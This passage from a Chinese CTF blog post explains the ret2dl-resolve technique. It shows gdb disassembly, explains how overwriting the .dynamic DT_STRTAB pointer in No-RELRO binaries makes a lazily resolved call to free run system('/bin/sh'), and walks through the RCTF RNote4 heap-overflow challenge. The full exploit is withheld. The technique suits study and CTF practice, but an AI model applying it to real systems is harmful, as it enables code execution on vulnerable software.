<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">   0x00007ffff7de9434 &lt;+100&gt;:   mov    rax,QWORD PTR [r10+0x1c8]</span><br><span class="line">   0x00007ffff7de943b &lt;+107&gt;:   test rax,rax</span><br><span class="line">   0x00007ffff7de943e &lt;+110&gt;:   je     0x7ffff7de9530 &lt;_dl_fixup+352&gt;</span><br><span class="line">   0x00007ffff7de9444 &lt;+116&gt;:   mov    rax,QWORD PTR [rax+0x8]</span><br><span class="line">=&gt; 0x00007ffff7de9448 &lt;+120&gt;:   movzx  eax,WORD PTR [rax+rdx*2]</span><br><span class="line">   0x00007ffff7de944c &lt;+124&gt;:   and    eax,0x7fff</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这里的<code>r10</code>保存的便是<code>link_map</code>的地址，所以只需<code>QWORD PTR [r10+0x1c8]</code>处为<code>NULL</code>即可跳过这一段。这便是roputils中这一操作的由来。</p>
<h4 id="0xb-第二种攻击方式："><a href="#0xb-第二种攻击方式：" class="headerlink" title="0xb. 第二种攻击方式："></a>0xb. 第二种攻击方式：</h4><p><strong>改写.dynamic的DT_STRTAB：</strong></p>
<p>这个只有在checksec时<code>No RELRO</code>可行，即<code>.dynamic</code>可写。因为<code>ret2dl-resolve</code>会从<code>.dynamic</code>里面拿<code>.dynstr</code>字符串表的指针，然后加上offset取得函数名并且在动态链接库中搜索这个函数名，然后调用。而假如说我们能够<strong>改写</strong>这个指针到一块我们能够操纵的内存空间，当resolve的时候，就能resolve成我们所指定的任意库函数。比方说，原本是一个<code>free</code>函数，我们就把原本是<code>free</code>字符串的那个偏移位置设为<code>system</code>字符串，<strong>第一次</strong>调用<code>free(&quot;bin/sh&quot;)</code>（因为只有第一次才会resolve），就等于调用了<code>system(&quot;/bin/sh&quot;)</code>。</p>
<p>攻击流程图：</p>
<p><img src="/Return_to_dl_resolve/resolve13.png" alt="resolve13"></p>
<p>所以利用关键就是能改变str的地址，先来了解一下str的结构：</p>
<p><strong>.dynstr：</strong></p>
<p><img src="/Return_to_dl_resolve/742286_YBW9WNCFG6ARTBN.png" alt="742286_YBW9WNCFG6ARTBN"></p>
<p>一个字符串表，index为0的地方永远是0，然后后面是动态链接所需的字符串，0结尾，包括导入函数名，比方说这里很明显有个puts。到时候，相关数据结构引用一个字符串时，用的是<strong>相对这个section头的偏移</strong>，比方说，在这里，就是字符串相对0x804821C的偏移。</p>
<p>先用：<code>readelf -a file</code> 找到.dynstr的地址：</p>
<p><img src="/Return_to_dl_resolve/resolve14.png" alt="resolve14"></p>
<p>然后需要找到这个地址存放的地方，从而将这个地址修改成指定的字符串地址，使用<code>readelf-R .dynamic file</code> 能够找到.dynstr所在的位置。</p>
<p><img src="/Return_to_dl_resolve/resolve15.png" alt="resolve15"></p>
<p>将这个地址换成我们指定的可写地址（bss段），从而完成伪造。</p>
<p><strong>例题：</strong></p>
<p>RCTF的RNote4，题目是一道堆溢出，<code>NO RELRO</code>而且<code>NO PIE</code>溢出到后面的指针可以实现任意地址写。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 edit()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int8 a1; // [rsp+Eh] [rbp-12h]</span><br><span class="line">  unsigned __int8 size; // [rsp+Fh] [rbp-11h]</span><br><span class="line">  note *v3; // [rsp+10h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v4; // [rsp+18h] [rbp-8h]</span><br><span class="line"> </span><br><span class="line">  v4 = __readfsqword(0x28u);</span><br><span class="line">  a1 = 0;</span><br><span class="line">  read_buf((char *)&amp;a1, 1u);</span><br><span class="line">  if ( !notes[a1] )</span><br><span class="line">    exit(-1);</span><br><span class="line">  v3 = notes[a1];</span><br><span class="line">  size = 0;</span><br><span class="line">  read_buf((char *)&amp;size, 1u);</span><br><span class="line">  read_buf(v3-&gt;buf, size);                      // heap overflow堆溢出</span><br><span class="line">  return __readfsqword(0x28u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">unsigned __int64 add()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int8 size; // [rsp+Bh] [rbp-15h]</span><br><span class="line">  int i; // [rsp+Ch] [rbp-14h]</span><br><span class="line">  note *v3; // [rsp+10h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v4; // [rsp+18h] [rbp-8h]</span><br><span class="line"> </span><br><span class="line">  v4 = __readfsqword(0x28u);</span><br><span class="line">  if ( number &gt; 32 )</span><br><span class="line">    exit(-1);</span><br><span class="line">  size = 0;</span><br><span class="line">  v3 = (note *)calloc(0x10uLL, 1uLL);</span><br><span class="line">  if ( !v3 )</span><br><span class="line">    exit(-1);</span><br><span class="line">  read_buf((char *)&amp;size, 1u);</span><br><span class="line">  if ( !size )</span><br><span class="line">    exit(-1);</span><br><span class="line">  v3-&gt;buf = (char *)calloc(size, 1uLL); //堆中存放了指针，所以可以通过这个任意写</span><br><span class="line">  if ( !v3-&gt;buf )</span><br><span class="line">    exit(-1);</span><br><span class="line">  read_buf(v3-&gt;buf, size);</span><br><span class="line">  v3-&gt;size = size;</span><br><span class="line">  for ( i = 0; i &lt;= 31 &amp;&amp; notes[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  notes[i] = v3;</span><br><span class="line">  ++number;</span><br><span class="line">  return __readfsqword(0x28u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以先add两个note，然后编辑第一个note使得堆溢出到第二个note的指针，然后再修改第二个note，实现任意写。至于写什么，刚刚也说了，先写<code>.dynamic</code>指向字符串表的指针，使其指向一块可写内存，比如<code>.bss</code>，然后再写这块内存，使得相应偏移出刚好有个<code>system\x00</code>。exp就不放了，有需要的联系我就可。</p>
<p>这个技巧真的是很有效的一种利用方式，而且很简洁，很快速，所以说能很熟练的利用这一个技巧的话，会在以后的解题过程当中省时省力很多。</p>
<h3 id="Reference："><a href="#Reference：" class="headerlink" title="Reference："></a>Reference：</h3><ol>
<li><a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a></li>
<li><a href="http://showlinkroom.me/2017/04/09/ret2dl-resolve/" target="_blank" rel="noopener">http://showlinkroom.me/2017/04/09/ret2dl-resolve/</a></li>
<li><a href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/" target="_blank" rel="noopener">http://rk700.github.io/2015/08/09/return-to-dl-resolve/</a></li>
<li><a href="https://bbs.pediy.com/thread-227034.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-227034.htm</a></li>
<li><a href="https://github.com/firmianay/CTF-All-In-One/blob/master/doc/6.1.3_pwn_xdctf2015_pwn200.md" target="_blank" rel="noopener">https://github.com/firmianay/CTF-All-In-One/blob/master/doc/6.1.3_pwn_xdctf2015_pwn200.md</a></li>
<li><a href="https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf" target="_blank" rel="noopener">https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf</a></li>
</ol>

    
  </div>

  
      <div class="git"></div>
  

</article>


   
  <div class="text-center donation">
    <div class="inner-donation">
      <span class="btn-donation">支持一下</span>
      <div class="donation-body">
        <div class="tip text-center">扫一扫，支持v1nke</div>
        <ul>
        
          <li class="item">
            <span>微信扫一扫</span>
            <img src="/images/qr-wechat.jpeg" alt="">
          </li>
        
          <li class="item">
            <span>支付宝扫一扫</span>
            <img src="/images/qr-wechat.jpeg" alt="">
          </li>
        
        </ul>
      </div>
    </div>
  </div>


   
  <div class="box-prev-next clearfix">
    <a class="show pull-left" href="/2018/06/19/数组越界之入门向/">
        <i class="icon icon-angle-left"></i>
    </a>
    <a class="show pull-right" href="/2018/09/11/hack.lu ctf 2015 bookstore/">
        <i class="icon icon-angle-right"></i>
    </a>
  </div>




</div>


  <a id="backTop" class="back-top">
    <i class="icon-angle-up"></i>
  </a>




  <div class="modal" id="modal">
  <span id="cover" class="cover hide"></span>
  <div id="modal-dialog" class="modal-dialog hide-dialog">
    <div class="modal-header">
      <span id="close" class="btn-close">关闭</span>
    </div>
    <hr>
    <div class="modal-body">
      <ul class="list-toolbox">
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/archives/"
              rel="noopener noreferrer"
              target="_self"
              >
              博客
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/tag/"
              rel="noopener noreferrer"
              target="_self"
              >
              标签
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/link/"
              rel="noopener noreferrer"
              target="_self"
              >
              友链
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/about/"
              rel="noopener noreferrer"
              target="_self"
              >
              关于
            </a>
          </li>
        
      </ul>

    </div>
  </div>
</div>



  
      <div class="fexo-comments comments-post">
    

    
    

    
    

    

    
    

  </div>

  

  <script type="text/javascript">
  function loadScript(url, callback) {
    var script = document.createElement('script')
    script.type = 'text/javascript';

    if (script.readyState) { //IE
      script.onreadystatechange = function() {
        if (script.readyState == 'loaded' ||
          script.readyState == 'complete') {
          script.onreadystatechange = null;
          callback();
        }
      };
    } else { //Others
      script.onload = function() {
        callback();
      };
    }

    script.src = url;
    document.getElementsByTagName('head')[0].appendChild(script);
  }

  window.onload = function() {
    loadScript('/js/bundle.js?235683', function() {
      // load success
    });
  }
</script>

</body>
</html>
